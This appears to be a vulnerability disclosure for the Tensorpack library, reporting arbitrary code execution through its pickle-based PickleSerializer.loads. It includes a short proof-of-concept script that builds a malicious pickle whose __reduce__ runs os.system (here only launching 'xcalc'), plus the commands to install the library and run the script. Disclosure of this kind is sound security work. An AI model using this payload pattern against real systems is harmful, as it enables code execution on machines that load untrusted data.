# Description
Tensorpack is a neural network training interface based on TensorFlow.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install tensorpack')
from tensorpack.utils import serialize
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
dumps = pickle.dumps(ArbitraryCode())
serialize.PickleSerializer.loads(dumps)
```
* `pip3 install tensorpack`
* `python3 exploit.py`
